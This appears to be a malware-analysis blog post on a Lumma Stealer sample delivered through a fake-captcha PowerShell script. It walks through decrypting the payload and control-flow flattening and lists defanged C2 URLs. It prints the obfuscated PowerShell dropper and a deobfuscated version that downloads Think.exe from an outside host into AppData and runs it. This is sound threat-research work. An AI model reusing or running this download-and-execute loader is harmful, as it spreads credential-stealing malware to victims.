---
title: Malware Analyzing Series Blog 04
published: 2025-03-20
description: LummaStealer Analyze Blog.
tags: [PE, Blogging, Malware Analyze]
category: Malware Analyze
draft: false
---

# C2200325_A Case Study On Lumma Stealer

## Overview
Lumma Stealer (aka LummaC2 Stealer) is an information stealer written in C language that has been available through a Malware-as-a-Service (MaaS) model on Russian-speaking forums since at least August 2022. It is believed to have been developed by the threat actor "Shamel", who goes by the alias "Lumma".

## Think.exe

Sample: [9c99dee195b287c3fccd76570e4ad08aa702edf3b62ecc00a6ea6150572f448e](https://bazaar.abuse.ch/sample/9c99dee195b287c3fccd76570e4ad08aa702edf3b62ecc00a6ea6150572f448e/)

The sample was in powershell script, to be precisely there has been several case of "fake captcha", this seem to be one of its.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-1.png)

There aren't much thing to talk about the ps1 file, except for the main code below.

<pre style="white-space: pre-wrap;word-break: break-word;"><code class="language-ps1">
//download think.exe

$xpTWh =([regex]::Matches('212d30203c3c387267673b292e3c313824292b2d662b2725671c20212623662d302d6c192b242a296875686c2d263e720938380c293c29732e3d262b3c21272668100b110720031b606c003d0d25012f072964686c2a023c2e0c210a61332b3d3a24686c003d0d25012f0729686527686c2a023c2e0c210a35732e3d262b3c212726680f02012c1b186061332e3d262b3c212726682a3c2f2d606c1838270a120d6133212e6069601c2d3b3c6518293c20686518293c20686c2a023c2e0c210a616133100b110720031b686c1838270a120d686c2a023c2e0c210a35356c2a023c2e0c210a6875686c2d263e720938380c293c296863686f141c20212623662d302d6f732a3c2f2d686c30381c1f20661b3d2a1b3c3a21262f607b647b7961733b3c293a3c686c2a023c2e0c210a73350f02012c1b1873','.{2}')|%{ [char]([Convert]::ToByte($_.Value,16) -bxor 72) }) -join '';& $xpTWh.Substring(0,3) $xpTWh.Substring(34);exit;


iex http://saftyplace.com/Think.exe
$get_path_to_appdata = $env:AppData; //download in to appdata
function main($var, $path_to_PE){
	curl $var -o $path_to_PE
};
function do_something(){
	function get_string($path){
		if(!(Test-Path -Path $path_to_PE)){
			main $path $path_to_PE
		}
	}
	$path_to_PE = $env:AppData + '\Think.exe';
	get_string $xpTWh.SubString(3,31);
	start $path_to_PE;
}
do_something;
</code></pre>

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-2.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-3.png)

There a interesting function, look like it's loading key and hardcoded data inside the PE itself then execute a payload, the total size of that big chunk of data is exactly 0x56A00.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-4.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/Screenshot_1.png)

After loading all those in the register, skip a bit line of code, it will start decrypting itself

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-6.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/Screenshot_2.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-5.png)

At this point if we try to run the PE that got dumped out it will give us a warning. If this PE got crypted as above it will not show this, but getting it out like this making it return to it's original state.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-8.png)

Checking IDA.. Okay now this look more like an actual "Lumma Stealer", it's using Control Flow Flattening, so we can't see the actual address that it will jumping into.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-7.png)

Basically, the program will calculate the address to jump into, the intersting part that is how it's actually calculating for the new address not just choosing between the first or second hardcoded value

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-9.png)

There are still a lot of Indirect Jump that actually choosing between the 2 value of an offset

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-15.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-16.png)

But seeem those offset that it subtracting is all the same (correct me if I'm wrong cause I calculated some and it all the same)

```asm!
0043738E    call    nullsub_1
00437393    mov     eax, [esi+1E0h]
00437399    mov     ecx, [eax]
0043739B    mov     ecx, [ecx+8]
0043739E    sub     esp, 4
004373A1    mov     [esp], eax
004373A4    call    ecx
004373A6    mov     ecx, [esi+4F0h]
004373AC    mov     dword ptr [ecx], 0
004373B2    mov     eax, [esi+4F8h]
004373B8    mov     eax, [eax]
004373BA    mov     ecx, [ecx]
004373BC    mov     eax, [eax+ecx*4]
004373BF    mov     ecx, dword_453EBC
004373C5    xor     ecx, 772FEA59h
004373CB    sub     eax, ecx
004373CD    jmp     eax

00453EBC dword_453EBC    dd 77F939A2h
```
If we calculate like the asm above, it will load **77F939A2** into edx then xor edx with **772FEA59** the result will be **00d6d3fb**

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-11.png)

the same for this, **851A6D38 xor 85CCBEC3 is 00d6d3fb**, this making static analyzing very difficult, after hours of searching I found that [OAlab](https://www.patreon.com/c/oalabs) has a [deobfs script](https://gist.github.com/herrcore/0649d85a6838972db5da71bed6ed676b) for this, using it I managed to retrieve some of the address

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-17.png)

Some of the behaviour I found during debugging.

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-12.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-13.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-14.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/servername.png)

![alt text](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Lumma_200325/images/image-18.png)

PoC
```
https[:]//advennture[.]top/GKsiio
https[:]//targett[.]top/dsANGt
https[:]//sighbtseeing[.]shop/ASJnzh
https[:]//gojeourney[.]life/gSAoz
https[:]//holidamyup[.]today/AOzkns
https[:]//travewlio[.]shop/ZNxbHi
https[:]//esccapewz[.]run/ANSbwqy
https[:]//steamcommunity[.]com/profiles/76561199822375128
https[:]//triplooqp[.]world/APowko
https[:]//touvrlane[.]bet/ASKwjq
```

## 
